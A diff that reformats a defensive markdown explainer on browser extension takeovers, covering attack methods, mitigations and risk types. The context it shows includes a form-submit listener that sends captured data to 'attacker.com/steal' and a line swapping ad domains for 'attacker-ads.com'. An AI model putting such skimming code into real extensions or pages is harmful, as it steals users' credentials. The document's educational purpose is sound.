@@ -1,4 +1,6 @@
-## Browser Extension Takeovers
+<br>
+
+# Browser Extension Takeovers
 Browser extension takeovers **occur when malicious actors exploit vulnerabilities or manipulate browser extensions to gain unauthorized access, install malicious scripts, or hijack browser behavior**. These attacks can result in **cryptocurrency mining, credential theft, and adware injection, impacting user security and privacy**.
 
 ## 1. How Browser Extension Takeovers Happen
@@ -15,7 +17,8 @@ Browser extension takeovers **occur when malicious actors exploit vulnerabilitie
 3. **Exploiting Permissions**
   - Extensions often request excessive permissions (e.g., full access to websites, clipboard, or storage).
   - Example
-    - Extensions requesting:
+    - Extensions requesting  
+
 ```
 "permissions": ["*://*/*", "storage", "tabs"]
 ```
@@ -44,7 +47,8 @@ Browser extension takeovers **occur when malicious actors exploit vulnerabilitie
   - Techniques
     - Capturing keystrokes or form submissions.
     - Extracting session cookies for account takeovers.
-  - Example
+  - Example  
+
 ```
 document.addEventListener('submit', (e) => {
     fetch('https://attacker.com/steal', {
@@ -60,7 +64,8 @@ document.addEventListener('submit', (e) => {
     - Alters legitimate website content.
     - Redirects users to phishing or malware-laden websites.
   - Example
-    - Replacing ads on example.com with attacker-controlled ads
+    - Replacing ads on example.com with attacker-controlled ads  
+
 ```
 document.body.innerHTML = document.body.innerHTML.replace(/adnetwork\.com/g, 'attacker-ads.com');
 ```
@@ -100,7 +105,7 @@ document.body.innerHTML = document.body.innerHTML.replace(/adnetwork\.com/g, 'at
   - Keep both browsers and extensions updated to patch known vulnerabilities.
 
 ### e. Monitor Extension Behavior
-  - Use tools to analyze extensions:
+  - Use tools to analyze extensions
     - CRXcavator: Audits Chrome extensions for risks.
     - Privacy Badger: Blocks trackers and malicious scripts.
 
@@ -132,4 +137,5 @@ document.body.innerHTML = document.body.innerHTML.replace(/adnetwork\.com/g, 'at
 | Credential Stealers | Steals passwords, cookies, and tokens via input monitoring. | Account takeovers, data theft. |
 | Adware Injection | Injects ads or redirects traffic to malicious sites. | Alters content, phishing, revenue fraud. |
 
-**Browser extension takeovers pose a significant security risk, enabling attackers to inject miners, steal credentials, or display malicious ads**. By carefully managing permissions, auditing extensions, and staying vigilant about unusual behavior, users and organizations can reduce the risk of extension-related attacks. Security awareness and proper hygiene are key to preventing these takeovers.
+**Browser extension takeovers pose a significant security risk, enabling attackers to inject miners, steal credentials, or display malicious ads**. By carefully managing permissions, auditing extensions, and staying vigilant about unusual behavior, users and organizations can reduce the risk of extension-related attacks. Security awareness and proper hygiene are key to preventing these takeovers.  
+<br>
